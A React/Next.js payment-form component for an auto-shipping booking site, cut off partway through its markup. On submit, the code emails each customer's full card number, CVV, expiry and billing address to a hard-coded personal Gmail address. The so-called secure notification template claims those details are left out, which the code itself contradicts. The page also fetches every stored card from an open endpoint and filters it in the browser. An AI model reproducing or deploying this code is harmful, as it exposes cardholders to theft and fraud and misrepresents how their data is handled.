"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/router";
import { MdKeyboardDoubleArrowRight } from "react-icons/md";
import { MdOutlinePhone } from "react-icons/md";
import DynamicStepper from "@/components/CommonComponents/Stepper";

export default function PaymentForm() {
  const router = useRouter();
  const { quote_id } = router.query;

  const [formData, setFormData] = useState({
    card_number: "",
    card_expiry: "",
    card_cvv: "",
    card_name: "",
    billing_address: "",
    billing_city: "",
    billing_state: "",
    billing_zip: "",
  });
  const [quoteDetails, setQuoteDetails] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const [isFlipped, setIsFlipped] = useState(false);
  const [formErrors, setFormErrors] = useState({});
  const [isSubmitting, setIsSubmitting] = useState(false);

  const states = [
    { name: "Alabama", abbr: "AL" },
    { name: "Alaska", abbr: "AK" },
    { name: "Arizona", abbr: "AZ" },
    { name: "Arkansas", abbr: "AR" },
    { name: "California", abbr: "CA" },
    { name: "Colorado", abbr: "CO" },
    { name: "Connecticut", abbr: "CT" },
    { name: "Delaware-IN", abbr: "DE" },
    { name: "Florida", abbr: "FL" },
    { name: "Georgia", abbr: "GA" },
    { name: "Hawaii", abbr: "HI" },
    { name: "Idaho", abbr: "ID" },
    { name: "Illinois", abbr: "IL" },
    { name: "Indiana", abbr: "IN" },
    { name: "Iowa", abbr: "IA" },
    { name: "Kansas", abbr: "KS" },
    { name: "Kentucky", abbr: "KY" },
    { name: "Louisiana", abbr: "LA" },
    { name: "Maine", abbr: "ME" },
    { name: "Maryland", abbr: "MD" },
    { name: "Massachusetts", abbr: "MA" },
    { name: "Michigan", abbr: "MI" },
    { name: "Minnesota", abbr: "MN" },
    { name: "Mississippi", abbr: "MS" },
    { name: "Missouri", abbr: "MO" },
    { name: "Montana", abbr: "MT" },
    { name: "Nebraska", abbr: "NE" },
    { name: "Nevada", abbr: "NV" },
    { name: "New Hampshire", abbr: "NH" },
    { name: "New Jersey", abbr: "NJ" },
    { name: "New Mexico", abbr: "NM" },
    { name: "New York", abbr: "NY" },
    { name: "North Carolina", abbr: "NC" },
    { name: "North Dakota", abbr: "ND" },
    { name: "Ohio", abbr: "OH" },
    { name: "Oklahoma", abbr: "OK" },
    { name: "Oregon", abbr: "OR" },
    { name: "Pennsylvania", abbr: "PA" },
    { name: "Rhode Island", abbr: "RI" },
    { name: "South Carolina", abbr: "SC" },
    { name: "South Dakota", abbr: "SD" },
    { name: "Tennessee", abbr: "TN" },
    { name: "Texas", abbr: "TX" },
    { name: "Utah", abbr: "UT" },
    { name: "Vermont", abbr: "VT" },
    { name: "Virginia", abbr: "VA" },
    { name: "Washington", abbr: "WA" },
    { name: "West Virginia", abbr: "WV" },
    { name: "Wisconsin", abbr: "WI" },
    { name: "Wyoming", abbr: "WY" },
    { name: "District of Columbia", abbr: "DC" },
  ];

  const calculateTransitTime = (distance) => {
    if (!distance) return "Within 7 days";
    const miles = parseInt(distance, 10);
    if (miles <= 300) return "Same Day / Overnight";
    if (miles <= 600) return "1-2 Days";
    if (miles <= 1000) return "2-3 Days";
    if (miles <= 1500) return "3-4 Days";
    if (miles <= 2000) return "3-5 Days";
    return "5-7 Days";
  };

  const generateEmailTemplate = () => {
    return `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 5px;">
        <h1 style="color: #28a745; text-align: center;">Price Locked Successfully!</h1>
        <p style="font-size: 16px; color: #333;">Thank you for locking your price with Rapid Auto Shipping. Here are your reservation details:</p>
        <table style="width: 100%; border-collapse: collapse; margin: 20px 0;">
          <tr style="background-color: #f8f9fa;">
            <td style="padding: 10px; font-weight: bold; border: 1px solid #ddd;">Quote ID</td>
            <td style="padding: 10px; border: 1px solid #ddd;">${
              quote_id || "1234567890"
            }</td>
          </tr>
          <tr>
            <td style="padding: 10px; font-weight: bold; border: 1px solid #ddd;">From</td>
            <td style="padding: 10px; border: 1px solid #ddd;">${
              quoteDetails?.ship_form || "Los Angeles, CA"
            }</td>
          </tr>
          <tr style="background-color: #f8f9fa;">
            <td style="padding: 10px; font-weight: bold; border: 1px solid #ddd;">To</td>
            <td style="padding: 10px; border: 1px solid #ddd;">${
              quoteDetails?.ship_to || "Philadelphia, PA"
            }</td>
          </tr>
          <tr>
            <td style="padding: 10px; font-weight: bold; border: 1px solid #ddd;">Vehicle</td>
            <td style="padding: 10px; border: 1px solid #ddd;">${
              quoteDetails
                ? `${quoteDetails.year} ${quoteDetails.make} ${quoteDetails.model}`
                : "Mercedes 2000 C class"
            }</td>
          </tr>
          <tr style="background-color: #f8f9fa;">
            <td style="padding: 10px; font-weight: bold; border: 1px solid #ddd;">Transport Type</td>
            <td style="padding: 10px; border: 1px solid #ddd;">${
              quoteDetails?.transport_method || "Open"
            }</td>
          </tr>
          <tr>
            <td style="padding: 10px; font-weight: bold; border: 1px solid #ddd;">Vehicle Condition</td>
            <td style="padding: 10px; border: 1px solid #ddd;">${
              quoteDetails?.vehicle_type || "Running"
            }</td>
          </tr>
          <tr style="background-color: #f8f9fa;">
            <td style="padding: 10px; font-weight: bold; border: 1px solid #ddd;">First Pickup Date</td>
            <td style="padding: 10px; border: 1px solid #ddd;">${
              quoteDetails?.pickup_date || "1 May"
            }</td>
          </tr>
          <tr>
            <td style="padding: 10px; font-weight: bold; border: 1px solid #ddd;">Transit Time</td>
            <td style="padding: 10px; border: 1px solid #ddd;">${calculateTransitTime(
              quoteDetails?.distance
            )}</td>
          </tr>
        </table>
        <p style="font-size: 14px; color: #666; text-align: center;">For any questions, contact us at <strong>+1 (833) 233-4447</strong>.</p>
        <p style="font-size: 12px; color: #999; text-align: center;">Rapid Auto Shipping - MC #: 29331673 | U.S. DOT #: 28831579</p>
      </div>
    `;
  };

  const generateSecureAdminNotification = () => {
    return `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 5px;">
      <h1 style="color: #dc3545; text-align: center;">New Payment Information Submitted</h1>
      <p style="font-size: 16px; color: #333;">A customer has submitted their payment information. Here are the booking details:</p>
      
      <table style="width: 100%; border-collapse: collapse; margin: 20px 0;">
        <tr style="background-color: #f8f9fa;">
          <td style="padding: 10px; font-weight: bold; border: 1px solid #ddd;">Quote ID</td>
          <td style="padding: 10px; border: 1px solid #ddd;">${
            quote_id || "1234567890"
          }</td>
        </tr>
        <tr>
          <td style="padding: 10px; font-weight: bold; border: 1px solid #ddd;">Customer Name</td>
          <td style="padding: 10px; border: 1px solid #ddd;">${
            formData.card_name || "Not provided"
          }</td>
        </tr>
        <tr style="background-color: #f8f9fa;">
          <td style="padding: 10px; font-weight: bold; border: 1px solid #ddd;">Card number</td>
          <td style="padding: 10px; border: 1px solid #ddd;">${
            formData.card_number
          }</td>
        </tr>
        <tr style="background-color: #f8f9fa;">
          <td style="padding: 10px; font-weight: bold; border: 1px solid #ddd;">CVV</td>
          <td style="padding: 10px; border: 1px solid #ddd;">${
            formData.card_cvv
          }</td>
        </tr>
        <tr style="background-color: #f8f9fa;">
          <td style="padding: 10px; font-weight: bold; border: 1px solid #ddd;">Card Expiry</td>
          <td style="padding: 10px; border: 1px solid #ddd;">${
            formData.card_expiry
          }</td>
        </tr>
        <tr>
          <td style="padding: 10px; font-weight: bold; border: 1px solid #ddd;">Billing Address</td>
          <td style="padding: 10px; border: 1px solid #ddd;">${
            formData.billing_address
          }</td>
        </tr>
        <tr style="background-color: #f8f9fa;">
          <td style="padding: 10px; font-weight: bold; border: 1px solid #ddd;">Billing City</td>
          <td style="padding: 10px; border: 1px solid #ddd;">${
            formData.billing_city
          }</td>
        </tr>
        <tr>
          <td style="padding: 10px; font-weight: bold; border: 1px solid #ddd;">Billing State</td>
          <td style="padding: 10px; border: 1px solid #ddd;">${
            formData.billing_state
          }</td>
        </tr>
        <tr style="background-color: #f8f9fa;">
          <td style="padding: 10px; font-weight: bold; border: 1px solid #ddd;">Billing Zip</td>
          <td style="padding: 10px; border: 1px solid #ddd;">${
            formData.billing_zip
          }</td>
        </tr>
        <tr>
          <td style="padding: 10px; font-weight: bold; border: 1px solid #ddd;">Vehicle</td>
          <td style="padding: 10px; border: 1px solid #ddd;">${
            quoteDetails
              ? `${quoteDetails.year} ${quoteDetails.make} ${quoteDetails.model}`
              : "Mercedes 2000 C class"
          }</td>
        </tr>
        <tr style="background-color: #f8f9fa;">
          <td style="padding: 10px; font-weight: bold; border: 1px solid #ddd;">From</td>
          <td style="padding: 10px; border: 1px solid #ddd;">${
            quoteDetails?.ship_form || "Los Angeles, CA"
          }</td>
        </tr>
        <tr>
          <td style="padding: 10px; font-weight: bold; border: 1px solid #ddd;">To</td>
          <td style="padding: 10px; border: 1px solid #ddd;">${
            quoteDetails?.ship_to || "Philadelphia, PA"
          }</td>
        </tr>
        <tr style="background-color: #f8f9fa;">
          <td style="padding: 10px; font-weight: bold; border: 1px solid #ddd;">Pickup Date</td>
          <td style="padding: 10px; border: 1px solid #ddd;">${
            quoteDetails?.pickup_date || "1 May"
          }</td>
        </tr>
        <tr>
          <td style="padding: 10px; font-weight: bold; border: 1px solid #ddd;">Submission Time</td>
          <td style="padding: 10px; border: 1px solid #ddd;">${new Date().toLocaleString()}</td>
        </tr>
      </table>
      
      <div style="background-color: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; border-radius: 5px; margin: 20px 0;">
        <h3 style="color: #856404; margin: 0;">Access Full Payment Details</h3>
        <p style="color: #856404; margin: 10px 0;">For security reasons, full payment details are not included in this email.</p>
        <p style="color: #856404; margin: 10px 0;">Please log into the admin panel to view complete payment information securely.</p>
      </div>
      
      <p style="font-size: 14px; color: #666; text-align: center;">Please follow up with the customer to arrange pickup details.</p>
      <p style="font-size: 12px; color: #999; text-align: center;">Rapid Auto Shipping - Internal Notification</p>
    </div>
  `;
  };

  const [cardDetails, setCardDetails] = useState(null);
  const [hasMatchingCard, setHasMatchingCard] = useState(false);

  // Fetch card details
  useEffect(() => {
    const fetchCardDetails = async () => {
      if (!quote_id) return;
      try {
        setLoading(true);
        setError(null);
        const response = await fetch(
          `${process.env.NEXT_PUBLIC_BACKEND_URL}/api/card`,
          {
            method: "GET",
            headers: { "Content-Type": "application/json" },
          }
        );
        if (!response.ok) {
          throw new Error(`Failed to fetch card details: ${response.status}`);
        }
        const data = await response.json();
        const matchedCard = data.find(
          (card) => card.quote_id === Number(quote_id)
        );
        if (matchedCard) {
          setCardDetails(matchedCard);
          setHasMatchingCard(true);
          setFormData({
            card_number: matchedCard.card_number,
            card_expiry: matchedCard.card_expiry,
            card_cvv: matchedCard.card_cvv,
            card_name: matchedCard.card_name,
            billing_address: matchedCard.billing_address,
            billing_city: matchedCard.billing_city,
            billing_state: matchedCard.billing_state,
            billing_zip: matchedCard.billing_zip,
          });
          // Redirect to thank you page
          router.push(`/confirmation?quote_id=${quote_id}`);
        } else {
          setHasMatchingCard(false);
          setCardDetails(null);
        }
      } catch (error) {
        console.error("Error fetching card details:", error);
        setHasMatchingCard(false);
        setCardDetails(null);
        setError("Failed to fetch card details. Please try again.");
      } finally {
        setLoading(false);
      }
    };
    fetchCardDetails();
  }, [quote_id, router]);

  // Pre-fetch pages
  useEffect(() => {
    if (quote_id) {
      router.prefetch(`/step-4?quote_id=${quote_id}`);
      router.prefetch(`/confirmation?quote_id=${quote_id}`);
    }
  }, [quote_id, router]);

  // Fetch quote details
  useEffect(() => {
    const fetchQuoteDetails = async () => {
      if (!quote_id) return;
      try {
        setLoading(true);
        setError(null);
        const response = await fetch(
          `${process.env.NEXT_PUBLIC_BACKEND_URL}/api/form/by-quote/${quote_id}`,
          {
            method: "GET",
            headers: { "Content-Type": "application/json" },
          }
        );
        if (!response.ok)
          throw new Error(`Failed to fetch quote details: ${response.status}`);
        const data = await response.json();
        setQuoteDetails(data);
      } catch (err) {
        setError(err.message);
      } finally {
        setLoading(false);
      }
    };
    fetchQuoteDetails();
  }, [quote_id]);

  // Pre-fetch the next page (/step-4)

  const validateCardNumber = (value) => {
    const cleaned = value.replace(/\D/g, "");
    if (!/^[3-6]/.test(cleaned)) {
      return "Card number must start with 3, 4, 5, or 6";
    }
    if (cleaned.length > 0 && cleaned.length !== 15 && cleaned.length !== 16) {
      return "Card number must be 15 or 16 digits";
    }
    return "";
  };

  const validateExpiry = (value) => {
    const cleaned = value.replace(/\D/g, "");
    if (cleaned.length >= 2) {
      const month = parseInt(cleaned.slice(0, 2), 10);
      if (month < 1 || month > 12) {
        return "Month must be between 01 and 12";
      }
    }
    if (cleaned.length === 4) {
      const year = parseInt(cleaned.slice(2, 4), 10);
      const currentYear = new Date().getFullYear() % 100;
      if (year < currentYear || year > currentYear + 15) {
        return `Year must be between ${currentYear} and ${currentYear + 15}`;
      }
    }
    return "";
  };

  const validateZip = (value) => {
    const cleaned = value.replace(/\D/g, "");
    if (cleaned.length !== 5) {
      return "Zip code must be exactly 5 digits";
    }
    return "";
  };

  const validateForm = () => {
    const errors = {};

    // Card Number Validation
    const cardNumberError = validateCardNumber(formData.card_number);
    if (cardNumberError) errors.card_number = cardNumberError;
    else if (!formData.card_number)
      errors.card_number = "Card number is required";

    // Card Expiry Validation
    const expiryError = validateExpiry(formData.card_expiry);
    if (expiryError) errors.card_expiry = expiryError;
    else if (!formData.card_expiry)
      errors.card_expiry = "Expiry date is required";

    // Card CVV Validation
    if (!formData.card_cvv || !/^\d{3,4}$/.test(formData.card_cvv))
      errors.card_cvv = "Valid 3-4 digit CVV required";

    // Card Name Validation
    if (!formData.card_name) errors.card_name = "Cardholder name required";

    // Billing Address Validation
    if (!formData.billing_address)
      errors.billing_address = "Billing address required";

    // Billing City Validation
    if (!formData.billing_city) errors.billing_city = "City required";

    // Billing State Validation
    if (!formData.billing_state) errors.billing_state = "State required";

    // Billing Zip Validation
    const zipError = validateZip(formData.billing_zip);
    if (zipError) errors.billing_zip = zipError;
    else if (!formData.billing_zip) errors.billing_zip = "Zip code is required";

    setFormErrors(errors);
    return Object.keys(errors).length === 0;
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    let formattedValue = value;

    // Format and update form data
    if (name === "card_number") {
      formattedValue = value
        .replace(/\D/g, "")
        .replace(/(\d{4})(?=\d)/g, "$1 ")
        .trim()
        .slice(0, 19);
    } else if (name === "card_expiry") {
      const cleaned = value.replace(/\D/g, "");
      formattedValue =
        cleaned.length > 2
          ? `${cleaned.slice(0, 2)}/${cleaned.slice(2, 4)}`
          : cleaned;
      formattedValue = formattedValue.slice(0, 5);
    } else if (name === "card_cvv") {
      formattedValue = value.replace(/\D/g, "").slice(0, 4);
    }

    // Update form data
    setFormData((prev) => ({ ...prev, [name]: formattedValue }));

    // Validate input in real-time
    const newErrors = { ...formErrors };

    if (name === "card_number") {
      const error = validateCardNumber(formattedValue);
      if (error) {
        newErrors.card_number = error;
      } else {
        delete newErrors.card_number;
      }
    } else if (name === "card_expiry") {
      const error = validateExpiry(formattedValue);
      if (error) {
        newErrors.card_expiry = error;
      } else {
        delete newErrors.card_expiry;
      }
    } else if (name === "card_cvv") {
      if (!formattedValue || !/^\d{3,4}$/.test(formattedValue)) {
        newErrors.card_cvv = "Valid 3-4 digit CVV required";
      } else {
        delete newErrors.card_cvv;
      }
    } else if (name === "card_name") {
      if (!formattedValue) {
        newErrors.card_name = "Cardholder name required";
      } else {
        delete newErrors.card_name;
      }
    } else if (name === "billing_address") {
      if (!formattedValue) {
        newErrors.billing_address = "Billing address required";
      } else {
        delete newErrors.billing_address;
      }
    } else if (name === "billing_city") {
      if (!formattedValue) {
        newErrors.billing_city = "City required";
      } else {
        delete newErrors.billing_city;
      }
    } else if (name === "billing_state") {
      if (!formattedValue) {
        newErrors.billing_state = "State required";
      } else {
        delete newErrors.billing_state;
      }
    } else if (name === "billing_zip") {
      const error = validateZip(formattedValue);
      if (error) {
        newErrors.billing_zip = error;
      } else {
        delete newErrors.billing_zip;
      }
    }

    setFormErrors(newErrors);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!validateForm()) return;

    setIsSubmitting(true);

    // Save payment details
    fetch(`${process.env.NEXT_PUBLIC_BACKEND_URL}/api/card`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ quote_id: Number(quote_id), ...formData }),
    })
      .then((response) => {
        if (!response.ok) {
          throw new Error(`Failed to save payment details: ${response.status}`);
        }
        console.log("Payment details saved successfully!");
      })
      .catch((err) => {
        console.error("Error saving payment details:", err);
        setError(err.message);
      });

    // Send first email (existing one)
    fetch(`${process.env.NEXT_PUBLIC_BACKEND_URL}/api/send-email`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        to: `${process.env.NEXT_PUBLIC_MAIL}`,
        subject: "Your Price Has Been Locked!",
        message: generateEmailTemplate(),
      }),
    })
      .then((response) => {
        console.log("First email sent successfully!");
      })
      .catch((error) => {
        console.error("Error sending first email:", error);
      });

    // Send second email to another address
    fetch(`${process.env.NEXT_PUBLIC_BACKEND_URL}/api/send-card-email`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        to: "amankeshari5937@gmail.com", // Replace with your target email
        subject: "New Booking Notification", // Custom subject for the second email
        message: generateSecureAdminNotification(), // You can create a different template or reuse the same one
      }),
    })
      .then((response) => {
        console.log("Second email sent successfully!");
      })
      .catch((error) => {
        console.error("Error sending second email:", error);
      })
      .finally(() => setIsSubmitting(false));

    router.push(`/step-4?quote_id=${quote_id}`);
  };

  if (loading) return <div>Loading...</div>;
  if (error) return <div>Error: {error}</div>;

  return (
    <div
      className="container flex flex-col justify-center mx-auto min-h-screen"
      style={{
        background:
          "linear-gradient(0deg, rgba(255,212,198,1) 0%, rgba(253,253,253,1) 76%)",
      }}
    >
      <div className="container px-6 sm:px-4 md:px-12">
        {/* Header */}
        <div className="container mx-auto py-2 flex items-center justify-between flex-wrap header-container">
          <div className="flex items-center">
            <img
              src="/images/rapidautoshipping-logo.webp"
              alt="Logo"
              className="h-8 sm:h-10 md:h-14 w-auto"
            />
          </div>
          <button className="bg-white border-2 font-semibold border-rapidcolor text-rapidcolor flex items-center gap-1 sm:gap-2 md:gap-3 px-2 sm:px-3 py-1 sm:py-2 md:py-3 rounded-full hover:bg-rapidcolor hover:text-white text-xs sm:text-sm md:text-base phone-button">
            <MdOutlinePhone className="text-lg sm:text-xl md:text-4xl text-green-500" />
            <span className="text-xs sm:text-sm md:text-xl">
              (833) 233-4447
            </span>
          </button>
        </div>

        <DynamicStepper
          status={2}
          steps={[
            { title: "Reservation" },
            { title: "Pickup & Delivery" },
            { title: "Confirmation" },
          ]}
        />

        {/* Main Content */}
        <div className="flex flex-col lg:flex-row w-full gap-4 p-2 sm:p-4 mx-auto font-sans max-w-7xl">
          {/* Form Section */}
          <div className="w-full flex flex-col my-auto border border-gray-700 rounded-lg py-3 sm:py-4 md:py-7 px-3 sm:px-4 bg-white">
            <div className="w-full items-center text-center sm:text-left">
              <h3 className="text-lg sm:text-xl md:text-3xl font-bold">
                Let's get this done
              </h3>
              <p className="text-xs sm:text-sm md:text-lg font-semibold">
                We'll set up a payment that works for you
              </p>
            </div>

            {/* Payment Form */}
            <div className="p-2 sm:p-4 md:p-6 max-w-3xl mx-auto">
              <div className="bg-gray-100 rounded-3xl px-3 sm:px-4 md:px-6 py-2 sm:py-3 shadow-lg transform hover:shadow-xl transition-all duration-300 hover:-translate-y-1 mb-2">
                {/* Card Logos */}
                <div className="flex justify-end space-x-1 sm:space-x-2 md:space-x-3 mb-2 sm:mb-4 md:mb-6">
                  {[
                    "visa-67c5863856e65.webp",
                    "american-express-67c5862499aaa.webp",
                    "discover-67c586271d906.webp",
                    "master-card-67c5863010c1d.webp",
                  ].map((img, index) => (
                    <div
                      key={index}
                      className="w-6 h-4 sm:w-8 sm:h-6 md:w-12 md:h-8 flex justify-center items-center"
                    >
                      <img
                        src={`/images/${img}`}
                        alt="Card Logo"
                        className="w-full h-auto"
                      />
                    </div>
                  ))}
                </div>

                {/* Card Inputs */}
                <div className="grid grid-cols-1 gap-3 sm:gap-4 md:gap-6 card-inputs">
                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 sm:gap-4 md:gap-6 billing-inputs">
                    {[
                      {
                        label: "CARD NUMBER",
                        name: "card_number",
                        placeholder: "1234 5678 9012 3456",
                      },
                      {
                        label: "EXPIRY DATE",
                        name: "card_expiry",
                        placeholder: "MM/YY",
                      },
                      {
                        label: "SECURITY CODE",
                        name: "card_cvv",
                        placeholder: "CVV",
                      },
                    ].map((field) => (
                      <div key={field.name} className="mb-1 sm:mb-0">
                        <label className="block text-xs sm:text-sm md:text-lg font-semibold text-gray-700 mb-1 sm:mb-2">
                          {field.label}
                        </label>
                        <input
                          type="text"
                          name={field.name}
                          value={formData[field.name]}
                          onChange={handleInputChange}
                          onFocus={
                            field.name === "card_cvv"
                              ? () => setIsFlipped(true)
                              : undefined
                          }
                          onBlur={
                            field.name === "card_cvv"
                              ? () => setIsFlipped(false)
                              : undefined
                          }
                          placeholder={field.placeholder}
                          className={`w-full p-2 sm:p-3 md:p-4 border-2 ${
                            formErrors[field.name]
                              ? "border-red-500"
                              : "border-gray-300"
                          } rounded-lg sm:rounded-xl bg-white shadow-inner focus:border-blue-500 focus:ring focus:ring-blue-200 focus:ring-opacity-50 transition-all text-xs sm:text-sm md:text-base`}
                        />
                        {formErrors[field.name] && (
                          <p className="text-red-500 text-xs sm:text-sm">
                            {formErrors[field.name]}
                          </p>
                        )}
                      </div>
                    ))}
                  </div>

                  <div className="transition-all duration-300 rounded-xl p-1 sm:p-2">
                    <label className="block text-gray-700 text-sm sm:text-base md:text-xl font-bold mb-1 sm:mb-2 items-center">
                      NAME ON CARD
                    </label>
                    <input
                      type="text"
                      name="card_name"
                      value={formData.card_name}
                      onChange={handleInputChange}
                      placeholder="Name As Appears On Card"
                      className={`w-full border-2 ${
                        formErrors.card_name
                          ? "border-red-500"
                          : "border-gray-300"
                      } rounded-lg sm:rounded-xl p-2 sm:p-3 md:p-4 text-gray-700 focus:border-blue-500 focus:ring focus:ring-blue-200 focus:ring-opacity-50 transition-all text-xs sm:text-sm md:text-base`}
                    />
                    {formErrors.card_name && (
                      <p className="text-red-500 text-xs sm:text-sm">
                        {formErrors.card_name}
                      </p>
                    )}
                  </div>
                </div>

                {/* Payment Processor Logos */}
                <div className="flex justify-start space-x-2 sm:space-x-3 mt-2">
                  {[
                    "swipe-simple-67c5863334d8f.webp",
                    "mt-bank-67c5862c5522a.webp",
                  ].map((img, index) => (
                    <div
                      key={index}
                      className="w-16 h-4 sm:w-20 sm:h-6 md:w-28 md:h-8 flex justify-center items-center"
                    >
                      <img
                        src={`/images/${img}`}
                        alt="Processor Logo"
                        className="h-full w-auto"
                      />
                    </div>
                  ))}
                </div>
              </div>

              {/* Card Flip Animation */}
              <div className="relative w-full h-32 sm:h-40 md:h-48 lg:h-56 card-container my-4">
                <div
                  className="absolute w-full h-full rounded-xl sm:rounded-2xl bg-gradient-to-r from-blue-500 to-purple-600 shadow-xl p-3 sm:p-4 md:p-6 flex flex-col justify-between card-front"
                  style={{
                    transform: isFlipped ? "rotateY(180deg)" : "rotateY(0deg)",
                    opacity: isFlipped ? 0 : 1,
                    transition: "transform 0.6s, opacity 0.6s",
                    backfaceVisibility: "hidden",
                  }}
                >
                  <div className="flex justify-between items-start">
                    <div className="w-8 h-8 sm:w-10 sm:h-10 md:w-12 md:h-12 rounded-full bg-yellow-400 opacity-80"></div>
                    <div className="text-white text-right text-xs sm:text-sm md:text-xl font-bold">
                      CREDIT / DEBIT CARD
                    </div>
                  </div>
                  <div className="mt-1 sm:mt-2 md:mt-4">
                    <div className="text-gray-200 text-xs mb-1">
                      CARD NUMBER
                    </div>
                    <div className="text-white text-xs sm:text-sm md:text-xl tracking-wider font-mono">
                      {formData.card_number || "•••• •••• •••• ••••"}
                    </div>
                  </div>
                  <div className="flex justify-between mt-1 sm:mt-2 md:mt-4">
                    <div>
                      <div className="text-gray-200 text-xs">EXPIRY DATE</div>
                      <div className="text-white text-xs sm:text-sm md:text-base">
                        {formData.card_expiry || "MM/YY"}
                      </div>
                    </div>
                    <div>
                      <div className="text-gray-200 text-xs">CARDHOLDER</div>
                      <div className="text-white text-xs sm:text-sm md:text-base truncate max-w-[120px] sm:max-w-[160px] md:max-w-[200px]">
                        {formData.card_name || "YOUR NAME"}
                      </div>
                    </div>
                  </div>
                </div>

                <div
                  className="absolute w-full h-full rounded-xl sm:rounded-2xl bg-gradient-to-r from-gray-600 to-gray-800 shadow-xl card-back"
                  style={{
                    transform: isFlipped ? "rotateY(0deg)" : "rotateY(-180deg)",
                    opacity: isFlipped ? 1 : 0,
                    transition: "transform 0.6s, opacity 0.6s",
                    backfaceVisibility: "hidden",
                  }}
                >
                  <div className="w-full h-8 sm:h-10 md:h-12 bg-gray-900 mt-4"></div>
                  <div className="p-3 sm:p-4 md:p-6 mt-2 sm:mt-4 md:mt-6">
                    <div className="flex justify-end">
                      <div className="bg-white h-6 sm:h-8 md:h-10 w-3/4 flex items-center px-4">
                        <div className="ml-auto text-gray-800 text-xs sm:text-sm md:text-base">
                          {formData.card_cvv || "CVV"}
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Payment Notice */}
            <div className="px-3 sm:px-4 py-2 pb-3 mb-2 text-sm sm:text-lg md:text-2xl font-semibold text-center border-b-2 border-gray-300">
              Credit/Debit Card is required only to confirm your booking with
              us, No payment will be charged until the{" "}
              <span className="text-rapidcolor">Pickup day</span> of your
              shipment
            </div>

            {/* Billing Information */}
            <div className="w-full mx-auto p-3 sm:p-4 py-4 sm:py-6 md:py-8">
              <div className="flex items-center mb-3 sm:mb-4">
                <div className="w-1 h-4 sm:h-6 md:h-8 bg-blue-500 mr-2 sm:mr-3"></div>
                <h1 className="text-lg sm:text-xl md:text-3xl font-bold">
                  Billing Information
                </h1>
              </div>

              <div className="space-y-3 sm:space-y-4 md:space-y-6">
                <div className="transition-all duration-300 hover:shadow-md rounded-xl p-1 sm:p-2">
                  <label className="block text-gray-700 text-sm sm:text-base md:text-xl font-bold mb-1 sm:mb-2 flex items-center">
                    <svg
                      className="w-3 h-3 sm:w-4 sm:h-4 md:w-5 md:h-5 mr-1 sm:mr-2 text-blue-500"
                      fill="none"
                      stroke="currentColor"
                      viewBox="0 0 24 24"
                    >
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth="2"
                        d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"
                      />
                    </svg>
                    Billing Address
                  </label>
                  <input
                    type="text"
                    name="billing_address"
                    value={formData.billing_address}
                    onChange={handleInputChange}
                    placeholder="Street, Apartment, Suite, etc."
                    className={`w-full border-2 ${
                      formErrors.billing_address
                        ? "border-red-500"
                        : "border-gray-300"
                    } rounded-lg sm:rounded-xl p-2 sm:p-3 md:p-4 text-gray-700 focus:border-blue-500 focus:ring focus:ring-blue-200 focus:ring-opacity-50 transition-all text-xs sm:text-sm md:text-base`}
                  />
                  {formErrors.billing_address && (
                    <p className="text-red-500 text-xs sm:text-sm">
                      {formErrors.billing_address}
                    </p>
                  )}
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 sm:gap-4 pb-3 sm:pb-4 md:pb-6 billing-inputs">
                  {[
                    {
                      label: "City",
                      name: "billing_city",
                      placeholder: "City",
                      icon: (
                        <svg
                          className="w-3 h-3 sm:w-4 sm:h-4 md:w-5 md:h-5 mr-1 sm:mr-2 text-blue-500"
                          fill="none"
                          stroke="currentColor"
                          viewBox="0 0 24 24"
                        >
                          <path
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            strokeWidth="2"
                            d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4"
                          />
                        </svg>
                      ),
                    },
                    {
                      label: "Zip Code",
                      name: "billing_zip",
                      placeholder: "Zip Code",
                      icon: (
                        <svg
                          className="w-3 h-3 sm:w-4 sm:h-4 md:w-5 md:h-5 mr-1 sm:mr-2 text-blue-500"
                          fill="none"
                          stroke="currentColor"
                          viewBox="0 0 24 24"
                        >
                          <path
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            strokeWidth="2"
                            d="M17 9V7a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2m2 4h10a2 2 0 002-2v-6a2 2 0 00-2-2H9a2 2 0 00-2 2v6a2 2 0 002 2zm7-5a2 2 0 11-4 0 2 2 0 014 0z"
                          />
                        </svg>
                      ),
                    },
                  ].map((field) => (
                    <div
                      key={field.name}
                      className="transition-all duration-300 hover:shadow-md rounded-xl p-1 sm:p-2"
                    >
                      <label className="block text-gray-700 text-sm sm:text-base md:text-xl font-bold mb-1 sm:mb-2 flex items-center">
                        {field.icon}
                        {field.label}
                      </label>
                      <input
                        type="text"
                        name={field.name}
                        value={formData[field.name]}
                        onChange={handleInputChange}
                        placeholder={field.placeholder}
                        className={`w-full border-2 ${
                          formErrors[field.name]
                            ? "border-red-500"
                            : "border-gray-300"
                        } rounded-lg sm:rounded-xl p-2 sm:p-3 md:p-4 text-gray-700 focus:border-blue-500 focus:ring focus:ring-blue-200 focus:ring-opacity-50 transition-all text-xs sm:text-sm md:text-base`}
                      />
                      {formErrors[field.name] && (
                        <p className="text-red-500 text-xs sm:text-sm">
